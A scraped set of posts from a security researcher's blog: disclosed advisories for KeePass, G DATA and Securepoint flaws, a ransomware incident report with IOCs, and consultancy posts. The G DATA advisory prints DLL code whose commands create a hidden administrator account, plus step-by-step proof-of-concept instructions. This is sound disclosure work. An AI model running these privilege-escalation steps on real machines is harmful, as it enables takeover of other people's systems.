| © 2012 [bogner.sh](http://bogner.sh) |  | [Suffusion theme by Sayontan Sinha](http://aquoid.com/news/themes/suffusion/) |
| --- | --- | --- |



=== Content from bogner.sh_6da2af0e_20250126_100406.html ===

## [#bogner.sh](https://bogner.sh)

# [CVE-2016-5119: MitM Attack against KeePass 2’s Update Check](https://bogner.sh/2016/03/mitm-attack-against-keepass-2s-update-check/ "CVE-2016-5119: MitM Attack against KeePass 2’s Update Check")

 [Security](https://bogner.sh/category/security/), [Software](https://bogner.sh/category/software/)
 [Add comments](#respond)

Mar 022016

This post is about a Man in the Middle (MitM) vulnerability in KeePass 2’s automatic update check. [KeePass](http://keepass.info/) – the free and open source password manager – uses, in all versions up to the current 2.33, unencrypted HTTP requests to check for new software versions. An attacker can abuse this automatic update check – if enabled – to “release” a new version and redirect the user to a malicious download page. **Update**: At the first start the users is asked if he wishes to enable the recommended update checks.

During a recent traffic analysis I stumbled upon an interesting request to <http://keepass.info/update/version2x.txt.gz>. As I had a few hours spare over the last weekend I took a closer look.

[![Screen Shot 2016-02-08 at 10.40.20](https://bogner.sh/wp-content/uploads/2016/02/Screen-Shot-2016-02-08-at-10.40.20-300x169.png)](https://bogner.sh/wp-content/uploads/2016/02/Screen-Shot-2016-02-08-at-10.40.20.png)

It turned out that KeePass 2’s automatic update check uses HTTP to request the current version information. For that purpose it downloads the following text file from <http://keepass.info/update/version2x.txt.gz>

```

:
KeePass:2.31
ArcFour Cipher Plugin:2.0.9
CodeWallet3ImportPlugin:1
DataBaseBackup:2.0.8.6
DataBaseReorder:2.0.8
EnableGridLines:1.1
eWallet Liberated Data Importer:0.12
IOProtocolExt:1.11
ITanMaster:2.28.0.2
KdbxLite:1.1
KeeAutoExec:1.8
KeeOldFormatExport:1
KeeResize:1.7
KPScript - Scripting KeePass:2.31
OnScreenKeyboard2:1.2
OtpKeyProv:2.4
PwGen8U:1
PwGenBaliktad:1.2
QR Code Generator:2.0.12
QualityColumn:1.2
Sample Plugin for Developers:2.0.9
SpmImport:1.2
WinKee:2.28.0.1
:

```

If a new version is available the following dialog is shown to the user. An attacker can modify – thought for example ARP spoofing or by providing a malicious Wifi Hotspot – the server response to introduce a new version and thereby force the following dialog to be shown. (Already heard about the new KeePass 9 release?)

[![Screen Shot 2016-02-08 at 10.52.20](https://bogner.sh/wp-content/uploads/2016/02/Screen-Shot-2016-02-08-at-10.52.20-300x92.png)](https://bogner.sh/wp-content/uploads/2016/02/Screen-Shot-2016-02-08-at-10.52.20.png)

If the user now clicks within the update dialog to download the new version, the URL <http://keepass.info/> is opened to manually download the new release. Guess what, we can also intercept that traffic as it again uses HTTP. Thereby an attacker can even indirectly control the downloaded “update”.

The following video shows the attack in all it’s glory:

## Suggested solution

For any security centric tool – like a password manager – it is essential to not expose its users to any additional risks.

Hence, I strongly recommend that all requests should be switch to encrypted HTTPS communication – especially version checks and updates! This should be fairly easy to implement and should not introduce any compatibility issues. Furthermore a valid certificate should be used for <https://keepass.info> and all unencrypted HTTP requests should be redirected to the encrypted version of the site. To provide even more security it is recommended to add the [HTTP Strict Transport Security (HSTS)](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security) headers. As an alternative the update check feature could be removed.

## Workaround

Until the version check has been switched to HTTPS update notifications should be taken with a grain of salt. To be on the safe side, new releases should be downloaded only directly from Keepass’s secured Sourceforge page: <https://sourceforge.net/projects/keepass/>

# Changelog

* 8.2.2016 @ 11:30: Issue privately reported to Dominik Reichl (<http://keepass.info/contact.html>)
* 8.2.2016 @ 12:00: CVE number requested
* 8.2.2016 @ 15:45: Received response from Dominik Reichl: The vulnerability will not be fixed. The indirect costs of switching to HTTPS (like lost advertisement revenue) make it a inviable solution.
* 30.5.2016 @ 18:00: MITRE assigned CVE-2016-5119; I reconfirmed that version 2.33 is still vulnerable
* 2.6.2016 @ 10:00: [Here is an official statement](https://sourceforge.net/p/keepass/discussion/329220/thread/e430cc12/#f398) from Dominik Reichl regarding this issue.
* 2.6.2016 @ 15:30: Even the Internet Storm Center at SANS mentioned my post about KeePass’s auto-update check over HTTP in their [Daily Network Security and Information Security Podcast](https://isc.sans.edu/podcastdetail.html?id=5023).
* 6.6.2016 @ 7:00: Dominik Reichl released [another post](http://keepass.info/help/kb/sec_issues.html#updsig) on this issue: from version 2.34 on the update information will be digitally signed. This mitigates man-in-the-middle attacks successfully.

 Posted by [florian](https://bogner.sh/author/florian/) at 14:10
### Leave a Reply [Cancel reply](/2016/03/mitm-attack-against-keepass-2s-update-check/#respond)

Your Comment

You may use these HTML tags and attributes: `<a href="" title=""> <abbr title=""> <acronym title=""> <b> <blockquote cite=""> <cite> <code> <del datetime=""> <em> <i> <q cite=""> <s> <strike> <strong>`

Name
 (required)

E-mail
 (required)

URI

 Notify me of followup comments via e-mail. You can also [subscribe](https://bogner.sh/comment-subscriptions/?srp=1977&srk=3b2a5787f990ce082d1e3fca55cfaa47&sra=s&srsrc=f) without commenting.

| [Reverse Engineering a Real World Malware](https://bogner.sh/2016/02/reverse-engineering-a-real-world-malware/) | [The Hard Life Of Exploit Developers](https://bogner.sh/2016/04/the-hard-life-of-exploit-developers/) |
| --- | --- |

### Search

### Pages

* [About Me](https://bogner.sh/about-me/)
  + [Curriculum Vitae](https://bogner.sh/wp-content/uploads/2017/11/Florian-Bogner-CV-20171126-NP.pdf#new_tab)
  + [LinkedIn Profile](https://www.linkedin.com/profile/view?id=368904276#new_tab)
  + [XING Profile](https://www.xing.com/profile/Florian_Bogner9#new_tab)
* [Donate](https://bogner.sh/donate1/)
* [Privacy Policy](https://bogner.sh/privacy-policy/)
* [Projects](https://bogner.sh/projects/)
* [References](https://bogner.sh/references/)
### Categories

* [Hardware](https://bogner.sh/category/hardware/) (4)
* [Linux](https://bogner.sh/category/linux/) (10)
* [Mac OS X](https://bogner.sh/category/mac-os-x/) (41)
* [Network](https://bogner.sh/category/network/) (6)
* [Security](https://bogner.sh/category/security/) (39)
* [Software](https://bogner.sh/category/software/) (34)
* [Tipps](https://bogner.sh/category/tipps/) (60)
* [Tools](https://bogner.sh/category/tools/) (21)
* [UAC Technikum Vienna](https://bogner.sh/category/uac-technikum-vienna/) (2)
* [Uncategorized](https://bogner.sh/category/uncategorized/) (18)
* [Web Security](https://bogner.sh/category/web-security/) (2)
* [Windows](https://bogner.sh/category/windows/) (27)

### Recent Posts

* [G DATA Anti-Virus: Abusing OpenSSL to get local admin](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/)
* [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/)
* [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)
* [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/)
* [Egregor Post-Incident Monitor / Protector Script](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/)
### Meta

* [Log in](https://bogner.sh/wp-login.php)
* [Entries feed](https://bogner.sh/feed/)
* [Comments feed](https://bogner.sh/comments/feed/)
* [WordPress.org](https://wordpress.org/)

| © 2012 [bogner.sh](http://bogner.sh) |  | [Suffusion theme by Sayontan Sinha](http://aquoid.com/news/themes/suffusion/) |
| --- | --- | --- |



=== Content from bogner.sh_bbd20e33_20250126_100407.html ===

# [#bogner.sh](https://bogner.sh)

## [G DATA Anti-Virus: Abusing OpenSSL to get local admin](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/ "G DATA Anti-Virus: Abusing OpenSSL to get local admin")

 [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/#respond)

Oct 052021

Just in case you need world-class penetration testing or security consulting services: [Bee IT Security](https://www.bee-itsecurity.at) should be your choice [German only]!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

This advisory is about a local privilege escalation in G Data’s Security Client “EndpointProtection Enterprise” that was first discovered in 2019. After the issues was again abused in 2021 to overtake a customer AD Domain, it was fixed by G DATA. The following blog post uses G DATA’s Security Client version 14.2.1.6 to discuss the vulnerability

![](https://bogner.sh/wp-content/uploads/2019/10/Untitled-2.png)

The underlying problem is, that the GdAgentSrv service (which is running as SYSTEM), tries to load its OpenSSL configuration from the non-existing path C:\Jenkins\vcpkg-master\packages\openssl-windows\_x86-141-static\openssl.cnf (newer versions load from C:\Jenkins\vcpkg-master\packages\openssl-windows\_x86-static\openssl.cnf).

![](https://bogner.sh/wp-content/uploads/2019/10/Untitled-3.png)

Luckily for us, we can abuse OpenSSL’s extensibility to not only load [TPM engines](https://github.com/ThomasHabets/openssl-tpm-engine/blob/master/openssl.cnf.sample), but also to inject malicious code into the GdAgentSrv process. To do that we create the previously identified openssl.cnf file at the given path and abuse the *dynamic\_path* option to specify a DLL of our choosing. Normal enduser permissions are sufficient for these actions.

![](https://bogner.sh/wp-content/uploads/2019/10/Untitled-4.png)

In this example we use the DLLMain entry point to create a new administrative user *attacker* as soon as the DLL is loaded

```

#pragma comment (lib, "User32.lib")

#include <windows.h>;

/*
	To compile 32bit dll:
	cl.exe /D_USRDLL /D_WINDLL dll.cpp /link /DLL /OUT:bad_dll.dll

	"C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\vcvarsall.bat" amd64
	cl.exe /D_USRDLL /D_WINDLL dll.cpp /link /DLL /OUT:bad_dll.dll
*/

BOOL WINAPI DllMain(
  _In_ HINSTANCE hinstDLL,
  _In_ DWORD     fdwReason,
  _In_ LPVOID    lpvReserved
) {

	system("net user attacker Batman42 /add");
	system("net localgroup Administrators attacker /add");

	return true;
}

```

After the system is rebooted (or the GdAgentSrv process is restarted) the config file is parsed and the DLL loaded. This in turn causes the new administrator to be added to the system:

![](https://bogner.sh/wp-content/uploads/2019/10/Untitled.png)
# Proof of Concept

To confirm this issue yourself install the G Data Security Client 14.2.1.6 and download the [precompiled version of the exploit files](https://bogner.sh/wp-content/uploads/2019/10/GData-LPE.zip).

After that, as a non-admin user, create the folder C:\Jenkins\vcpkg-master\packages\openssl-windows\_x86-141-static\ and place the previously downloaded files (openssl.cnf, bad\_dll.dll) therein. Now simply reboot the system. During the boot process, the new admin user *attacker* will be added. Full access to the affected endpoint has been gained.

## Mitigation

Update to the latest available version – which happens automatically anyway. Starting from 17.08.2021 the vulnerability is fixed

# Timeline

* 10.10.2019: The issue has been identified, documented and reported (ticket number CAS-730826-F7K4R9). No reply received.
* 11.2020: The issue was communicated again to G Data’s Sales Team in Austria. After initial communication no further feedback.
* 06.2021: The issues was abused during a security check to overtake another client’s infrastructure.
* 14.06.2021: G DATA confirms the vulnerability. Public disclosure is planed for 15th September 2021
* 17.08.2021: Fixed version is released to the public
* 05.10.2021: Public disclosure.

 Posted by [florian](https://bogner.sh/author/florian/) at 11:41

## [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/ "CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30")

 [Security](https://bogner.sh/category/security/), [Windows](https://bogner.sh/category/windows/)
 [No Responses »](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/#respond)

Jun 292021

*[ Preamble: A big thanks to the team at Securepoint! They immediately triaged our report and released an initial fix within days. Never forget: Every piece of software contains bugs! It depends on how you deal with them. ]*

During the audit of the Windows 10 base image of one of our clients, we discovered that they were using the free [Securepoint SSL VPN Client](https://www.securepoint.de/produkte/utm-firewalls/vpn-client.html). To be precise, version 2.0.30 – the current release as of writing – was installed.

Diese Schwachstelle wurde im Zuge eines unserer Hacking Workshops identifiziert. Mehr dazu auf unserer Webseite: [Bee IT Security](https://www.bee-itsecurity.at) – Wir machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

While taking a first glance at the application, it became clear that it uses two different components: on the one hand there is the user interface (1), which is executed in the context of the current user. On the other hand there is a Windows service which is executed as SYSTEM (2). This could be quite interesting from an attacker’s point of view, in case a normal user could manipulate the backend service in any way.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage11.jpg)

To learn more about the inner workings I used [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon). As shown in the following screenshot the user interface component *SSLVpnClient.exe* (1) uses a TCP connection to communicate with the Windows service *SPSSLVpnService.exe* (2). As discussed before, this service runs as SYSTEM. The actual VPN connection is established by *OpenVPN.exe* (3). The most interesting learning however was, that a OpenVPN configuration file, which is stored in the current users home folder, is passed as argument (4). This means, the file is fully attacker controlled.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage23.jpg)

While reading the [OpenVPN manual](https://community.openvpn.net/openvpn/wiki/Openvpn24ManPage), I found something interesting: By using (for example) the *–tls-verify* directive from within an *\*.ovpn* configuration file, it is possible to execute arbitrary commands. Hence, I created myself a malicious VPN configuration file. As shown in the right window, it launched the *C:\Users\Public\lpe.bat* file.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage75.jpg)

After saving the \*.*ovpn* file into a folder with the same name in *C:\Users\<username>\AppData\Roadming\Securepoint SSL VPN\config\* and restarting the SecurePoint VPN User interface, it is possible to connect to our malicious VPN.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage79.jpg)

By doing so, the *tls-verify* script is executed as SYSTEM and a new administrative user attacker is added. Hence, a normal non-administrative user gained full control over the affected endpoint.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage46.jpg)
## Timeline

* 14.04.2021: The vulnerability was discovered and reported to security@securepoint.de
* 15.04.2021: The report was triaged
* 26.04.2021: Securepoint SSL VPN Client Version 2.0.32 was released, which contains an initial fix for the vulnerability
* 23.06.2021: Securepoint SSL VPN Client Version 2.0.34 was released, which contains additional security measures.
* 28.06.2021: CVE-2021-35523 was assigned: <https://nvd.nist.gov/vuln/detail/CVE-2021-35523>
* 29.06.2021: Responsible disclosure in cooperation with Securepoint: <https://github.com/Securepoint/openvpn-client/security/advisories/GHSA-v8p8-4w8f-qh34>

 Posted by [florian](https://bogner.sh/author/florian/) at 07:00

## [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/ "TeslaRVNG2 meets HAFNIUM Exchange Exploit")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/#respond)

May 032021

This is the story of a recent Incident Response that we – as [Bee IT Security](https://bee-itsecurity.at/) – had to deal with. The first impression was pretty clear: many of the victim’s most important servers as well as clients were encrypted. One of the domain controllers also showed a ransom note which is never good sign. After a quick glance at the Window title, it was pretty clear that we had to deal with TeslaRVNG2 (anonymised screenshot from a sandbox):

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-1.png)

In contrast to REvil or DoppelPaymer there is not much information available about common TeslaRVNG2 TTPs. Hence, we started by analysing one of the encrypted clients with the goal of identifying the internal source of the attack. Thereby we found the following Logon Event (Event id 4624) which documents that the actual Domain Administrator logged on to the now encrypted PC. That event was created in the middle of the night (local time) and just a few hours before the last modified date of the encrypted files. Additionally, all the IT employees use named administrative accounts, which means this logon was caused by the attackers. The source was one of the company’s domain controllers.

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-2021-05-02-at-19.13.36.png)

A few seconds after that first logon, the Anti-Virus service was killed as well. Another clear indication that this activity was caused by the criminals.

## The Domain Controller

Hence, we now focused our analysis on the domain controller that was logged as the source of the login. After taking a snapshot, we captured our live response data and waited for the parsing to finish. During that time, I was curious and took a quick glance at the Windows directory. Multiple files caught my attention: MEMORY.dmp, msmpene.exe , …

![](https://bogner.sh/wp-content/uploads/2021/05/3_EXE-in-Windows.jpg)

More interesting stuff was located in inetsrv (*C:\Windows\System32\inetsrv*\). Is this server also the victim’s Exchange Server? Can you already guess what has happened?

![](https://bogner.sh/wp-content/uploads/2021/05/5_inetsrv-1.jpg)

Maybe we start by taking a closer look at *c.ps1*. As shown below *certutil* is abused to download additional payloads. For example, *m6.exe* is a Bitcoin Miner and *dn.ps1* established as backdoor. What immediately confirmed my initial guess: There are many activities (*echo* commands) that suggest that the HAFNIUM Exchange vulnerabilities were part of the attack.

![](https://bogner.sh/wp-content/uploads/2021/05/2_Script-1.jpg)

After talking to the system administrators this guess was confirmed. There were issues with installing the latest Exchange CU, which caused the server to be vulnerable for the critical vulnerabilities for too long.

## The TeslaRVNG2 Cryptolocker

So we now know how the attackers got initial access. But let’s focus on the actual cryptolocker (*msmpene.exe*). By executing the sample in a sandbox, we identified a plaintext log file that was masked as a DLL (*msvsc.dll*). This file gave us a good understanding about what has happened:

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-2021-05-02-at-19.44.31.png)

After the malware was launched (0) a network scan is started (1). Based on the observed behaviour we conclude that the IP range is derived from the current IP. However, the malware always used a /24 network here. So, if your company uses multiple subnets, this ransomware will not affect all of them. Again: please implement a network segmentation with a firewall in between!

In a separate thread the local disc is encrypted (2). During that process the original filenames are kept, making it more difficult for end-users to detect the ongoing attack.

For all identified hosts on the network (3) the access level is checked. If admin privileges are available different techniques are used to stop installed anti-virus solutions. After that all shares (4) are encrypted (5). So, there is no “real” lateral movement. The ransomware simply abuses Windows file sharing.

As soon as the local disc was fully encrypted the renaming process was started (6) (*original.txt => id[\*\*\*\*\*\*\*\*].[contact@domain.com].original.txt.teslarvng2*) and the ransom notes (7) are placed.

By comparing the victim’s log with the log of a fully encrypted system we can conclude that the process was interrupted. As shown below, if everything is finished the malware prints “the end :L”. That entry however is missing in the customer’s log.

![](https://bogner.sh/wp-content/uploads/2021/05/Picture-1.png)

Luckily a working backup was available, and the infrastructure could be rebuilt within days! No ransom was paid.

## IOCs

| **Type** | **Description** | **IOC** |
| --- | --- | --- |
| Hash | c.ps1 | c1bb24572db470c07ece739b889032ad9ab28e4d |
| Hash | msmpene.exe | e365a6acd90eb50ddc067790845b6ade0e1034ed |
| Hash | msmpene86.exe | dd9089097c559b1addbefd37b2da0e4bc2334244 |
| Hash | bd.bat | 7ad79e9e92346c425aa2b2ca1caeb64c33451a8d |
| Hash | svchost.exe | 630814297fc44d6df895e60490c57955cad3db31 |
| Host |  | t.hwqloan.com |
| Path |  | C:\inetpub\wwwroot\aspnet\_client\js\demo\wanlins.aspx |
| Path |  | C:\inetpub\wwwroot\aspnet\_client\js\demo\wanlin.txt |
| Hash | dns.ps1 | 0165405f79d402baec05078c4b4559f400a826f5 |
| Hash | m6.exe | 8f72a1e1faf496c05852338dd72aea868aa0f835 |

 Posted by [florian](https://bogner.sh/author/florian/) at 05:00

## [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/ "Dirty Offline Bulk IP Geolocation")

 [Security](https://bogner.sh/category/security/), [Tools](https://bogner.sh/category/tools/), [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/#respond)

Jan 192021

As of recently, I quite often receive Excel files with hundreds of IPs which need to be geolocated ([Can you guess where they come from](https://docs.microsoft.com/en-us/microsoft-365/compliance/search-the-audit-log-in-security-and-compliance?view=o365-worldwide)?). Sure, I could import them into our Elastic stack, but would that post then be titled “Dirty”?

So we need to come up with a different solution. While researching the topic, the first thing that became clear was that I need an offline solution. Although most of the time I just try to locate a handful of addresses, but this sometimes explodes to up to 5.000. In that case, it is almost impossible to find a suitable web API. The most generous free services only provide up to 1.000 lookups per week.

Luckily there is [MaxMind](https://www.maxmind.com/). They are the company behind GeoIP, which also offers a free offline database. Simple register for an [account on their website](https://www.maxmind.com/en/geolite2/signup).

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.13.02.png)

[Then access your account](https://www.maxmind.com/en/account/login) and select “Download Files” in the left menu. From the list, select the “GeoLite2 City” database file. It’s important to use the GeoIP2 Binary format.

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.15.11.png)

Finally, it’s time to get dirty: Download the script [dirtyiplocate.py](https://github.com/fbogner/dirtyiplocate/blob/main/dirtyiplocate.py) from Github or clone the whole repository. After that, the geoip2 modules needs to be installed (*pip install geoip2*).

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.19.41.png)

After all that hard work, *dirtyiplocate.py* is ready to rumble. As shown in the following screenshot it’s pretty easy to use. Provide a text file with IPs you want to locate (the *–ips* argument) and specify the output CSV file (the *–output* parameter). In case you want the results to be appended to the output file instead of overwriting it, the *–append* argument can be used.

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.22.50.png)

The following screenshot shows the output of *dirtyiplocate.py*. Excel’s [VLOOKUP](https://support.microsoft.com/en-us/office/vlookup-function-0bbc8083-26fe-4963-8ab8-93a18ad188a1) can now be used to incorporate this data into existing lists. Please always use the datatype TEXT for IP addresses. Otherwise a unicorn dies!

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.31.40.png)

To summaries: I built a dirty script that can be used to do bulk IP geolocation. It can be downloaded here: <https://github.com/fbogner/dirtyiplocate>

 Posted by [florian](https://bogner.sh/author/florian/) at 05:59

## [Egregor Post-Incident Monitor / Protector Script](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/ "Egregor Post-Incident Monitor / Protector Script")

 [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/#respond)

Dec 072020

During a recent Incident Response Assignment we at [Bee IT Security](https://bee-itsecurity.at) had to cope with a large Egregor attack. Many of our client’s most critical systems had been encrypted. Luckily, we were able to recover most of them from Offline backups.

However, we were unsure if (I) all encrypted systems had been identified and (II) if no further Egregor activities would trigger. Based on a great article from [Cybereason](https://www.cybereason.com/blog/cybereason-vs-egregor-ransomware) and our own investigations, we knew how the infection was carried out: A Powershell script was used to deploy a malicious DLL to all systems, which was then executed using WMI.

To answer both of our questions, I wrote a small PowerShell script, which checks the current system for the ransom note (I). Additionally the presence of the malicious DLL is checked and logged (II). To hinder further Egregor activity with the same library, a placeholder file is generated and protected with NTFS filesystem permissions (Everyone : Full Control : Deny). A GPO with a Scheduled Task was used to run it on all systems on an hourly base.

![](https://bogner.sh/wp-content/uploads/2020/12/Screenshot-2020-12-07-at-22.12.53.png)

In case you also have the pleasure to meet Egregor, you may find our script handy. You can download it here: <https://gist.github.com/fbogner/32fc8b73bcc50287ced91de1883421a9>

 Posted by [florian](https://bogner.sh/author/florian/) at 21:14

## [IT Security “Hausmittel”](https://bogner.sh/2020/11/it-security-hausmittel/ "IT Security “Hausmittel”")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/11/it-security-hausmittel/#respond)

Nov 162020

Erfahrungsgemäß sind IT Security Maßnahmen häufig schwierig zu implementieren und verursachen beträchtliche Kosten. Im Zuge unserer Tätigkeit als Security Consultants und Pentester haben wir aber einige Wege erarbeitet, wie einfach und kosteneffizient der Security Level der Infrastruktur erheblich verbessert werden kann.

Die 10 wichtigen „IT Security Hausmittel“ haben wir dazu in einem entsprechenden Whitepaper zusammengefasst.

Im Detail werden dabei drei unterschiedliche Maßnahmen-Kategorien empfohlen:

1. **Infektion**
   Um die Initiale Infektion von Endgeräten zu erschweren, werden Tipps zur Absicherung von gefährlichen Datentypen, Office Makros und PowerShell aufgezeigt
2. **Ausbreitung**
   Der Missbrauch von privilegierten Benutzerkonten ist häufig bei Attacken zu beobachten. Dementsprechend ist es entscheidend diese zu schützen. Einfache Gruppenrichtlinien, wie die Nutzung der PPL Technologie für den lsass.exe Prozess oder die automatische Abmeldung von administrativen Konten helfen digitale Angriffe erheblich zu erschweren.
3. **Compliance**
   Viele Unternehmen kämpfen auch immer noch mit Basistechnologien wie beispielsweise der Festplattenverschlüsselung. Wiederum mit einer Gruppenrichtlinie ist die Aktivierung dieser über BitLocker einfach möglich.

Das Whitepaper mit diesen und vielen weiteren Empfehlungen können Sie kostenlos unter folgender Webadresse herunterladen:

[![](https://bogner.sh/wp-content/uploads/2020/07/Screenshot-2020-07-06-at-10.18.23.png)](https://bee-itsecurity.at/downloads/IT%20Security%20Hausmittel)

Wir als Bee IT Security machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können. Unser Portfolio umfasst: Workshops, Penetration Tests, simuliertes Phishing. Wir freuen uns auf Ihre Kontaktaufnahme unter office@bee-itsecurity.at

 Posted by [florian](https://bogner.sh/author/florian/) at 10:15

## [Sicheres Client Admin Konzept](https://bogner.sh/2020/07/sicheres-client-admin-konzept/ "Sicheres Client Admin Konzept")

 [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2020/07/sicheres-client-admin-konzept/#respond)

Jul 062020

Bei vielen der von [Bee IT Security](https://bee-itsecurity.at/) durchgeführten Hacking Workshops (aka Infrastruktur Pentests) stellen wir fest, dass es erhebliche IT Security Defizite in der Handhabung von administrativen Konten gibt. Dies betrifft vor allem das dauerhafte Arbeiten mit administrativen Berechtigungen und die Mehrfachverwendung von Passwörtern für lokale Benutzer.

Das problematisch daran ist, dass bei praktisch jedem IT Angriff der letzten Monate und Jahre der Missbrauch privilegierter Konten ein wichtiger Baustein der Attacke war. Sei es der Hack der [ÖVP](https://futurezone.at/netzpolitik/oevp-hack-ermittlungen-werfen-neue-fragen-auf/400636748), der Angriff auf den [Heise Verlag](https://www.heise.de/ct/artikel/Trojaner-Befall-Emotet-bei-Heise-4437807.html), der [Emotet Befall im Kammergericht Berlin](https://www.heise.de/newsticker/meldung/Emotet-Berliner-Kammergericht-bleibt-bis-2020-weitgehend-offline-4569544.html) oder die [Ausbreitung im A1 Netzwerk](https://blog.haschek.at/2020/the-a1-telekom-hack.html).

Daher haben wir gemeinsam mit einigen ausgewählten Kunden (500 – 5.000 Mitarbeiter) ein Client Admin Konzept erarbeitet, welches auch wirklich für die IT Abteilung lebbar ist! Wir haben dabei versucht wirklich alle relevanten Szenarien abzubilden, darunter fällt u.a.:

* Wie führen sichere Remote-Unterstützung für Benutzer (Remote Assistance) durch?
* Wie können neue Programme am Endgerät installiert bzw. Probleme behoben werden?
* Wie können Recovery Aufgaben nach dem Verbindungsverlust zur Domäne noch durchgeführt werden?
* Gibt es weiterhin die Möglichkeit psexec o.ä. zu verwenden?

Daraus entstanden ist ein sechsseitiges Dokument, was die Gefahren der hier beschriebenen Worksflows beschreibt und entsprechende Lösungsvorschläge beinhaltet.

![](https://bogner.sh/wp-content/uploads/2020/07/Screenshot-2020-07-06-at-10.34.31.png)

Durch Umsetzung dieser Prozesse kann ein erheblicher Sicherheitsmehrwert in Richtung eines “Zero Trust” Ansatzes für Clients erreicht werden. Ziel muss sein, dass die Kompromittierung eines Rechners nicht sofort zum Domänen Administrator führt! Dies ist nämlich leider öfter möglich, als man denkt… Vielleicht auch bei Ihnen?

**Daher:** Laden Sie sich unser Whitepaper “Sicheres Client Admin Konzept” herunter und profitieren Sie von unserem Know-How!

[![](https://bogner.sh/wp-content/uploads/2020/07/Screenshot-2020-07-06-at-10.18.23.png)](https://bee-itsecurity.at/downloads/Sicheres%20Client%20Admin%20Konzept)
Wenn Sie Unterstützung bei Umsetzung der hier beschriebenen Maßnahmen benötigen, oder allgemein Ihre IT besser absichern wollen: [Bee IT Security](https://www.bee-itsecurity.at) – Wir machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

 Posted by [florian](https://bogner.sh/author/florian/) at 08:37

## [Oh nein: Unser Honeypot ist verschlüsselt ;-)](https://bogner.sh/2020/04/oh-nein-unser-honeypot-ist-verschlusselt/ "Oh nein: Unser Honeypot ist verschlüsselt ;-)")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/04/oh-nein-unser-honeypot-ist-verschlusselt/#respond)

Apr 062020

Wir als [Bee IT Security](https://bee-itsecurity.at/) unterstützten unsere Kunden tatkräftig bei der Absicherung Ihrer Infrastrukturen. Dabei ist es aber natürlich auch unerlässlich die Taktiken der Angreifer zu kennen und zu verstehen. Genau deshalb betreiben wir auch eigene Honeypots: absichtlich anfällige Server im Internet, die von Kriminellen gekapert werden können. Ziel ist es, deren Aktionen aufzuzeichnen, zu analysieren und schlussendlich sicherzustellen, dass die eigenen Absicherungsmaßnahmen die Angriffe abgewehrt hätten.

Mein Lieblings-Honeypot hört auf den Namen “MXB System” und ist mittels des Benutzernamen *admin* und dem absolut sicheren Passwort *admin* direkt aus dem Internet per RDP erreichbar. Für das Monitoring setzen wir eine Vielzahl unterschiedlicher Technologien ein:

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-19.46.58.png)

